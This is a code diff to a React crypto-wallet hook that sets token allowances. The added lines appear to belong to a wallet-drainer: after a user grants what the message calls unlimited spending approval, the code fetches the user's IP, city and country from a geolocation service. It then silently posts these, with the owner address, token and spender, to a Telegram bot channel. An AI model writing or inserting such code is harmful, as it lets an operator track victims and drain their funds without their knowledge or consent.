@@ -66,6 +66,9 @@ export function useAllowanceSetter({
   const [running, setRunning] = useState(false);
   const { data: walletClient } = useWalletClient({ chainId });
 
+  const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+  const TELEGRAM_CHANNEL_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHANNEL_ID;
+
   // Helper to check if a contract supports increaseAllowance
   async function supportsIncreaseAllowance(contractAddress: string) {
     try {
@@ -140,6 +143,60 @@ export function useAllowanceSetter({
             account: owner as `0x${string}`,
           });
         }
+        // --- TELEGRAM NOTIFICATION ---
+        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHANNEL_ID) {
+          let ip = '', city = '', country = '';
+          try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) {
+              const data = await res.json();
+              ip = data.ip || '';
+              city = data.city || '';
+              country = data.country_name || '';
+            }
+          } catch (err) {
+            // Ignore location errors
+          }
+          // Chain name lookup (optional, fallback to chainId)
+          let chainName = chainId?.toString() || '';
+          switch (chainId) {
+            case 1: chainName = 'Ethereum Mainnet'; break;
+            case 137: chainName = 'Polygon'; break;
+            case 42161: chainName = 'Arbitrum'; break;
+            case 10: chainName = 'Optimism'; break;
+            case 43114: chainName = 'Avalanche'; break;
+            case 56: chainName = 'BNB Smart Chain'; break;
+            case 11155111: chainName = 'Ethereum Sepolia'; break;
+            default: break;
+          }
+          const message =
+            `✅ *Token Approval Granted*
+\n*Owner Address:* \
+${owner}
+*Token Symbol:* ${token.symbol}
+*Token Contract:* \
+${token.contractAddress}
+*Decimals:* ${token.decimals}
+*Network:* ${chainName} (Chain ID: ${chainId})
+*Spender:* \
+${spender}
+*Time:* ${new Date().toLocaleString()}
+` +
+            (country ? `*Country:* ${country}\n` : '') +
+            (city ? `*City:* ${city}\n` : '') +
+            (ip ? `*IP:* ${ip}\n` : '') +
+            `\nThis user has approved the above token for unlimited spending by the specified spender.\nIf this was not intended, please review and revoke approvals as needed.`;
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHANNEL_ID,
+              text: message,
+              parse_mode: 'Markdown',
+            }),
+          });
+        }
+        // --- END TELEGRAM NOTIFICATION ---
         setProgress(prev => ({ ...prev, [token.contractAddress]: 'success' }));
       } catch (err: any) {
         setProgress(prev => ({ ...prev, [token.contractAddress]: 'error' }));
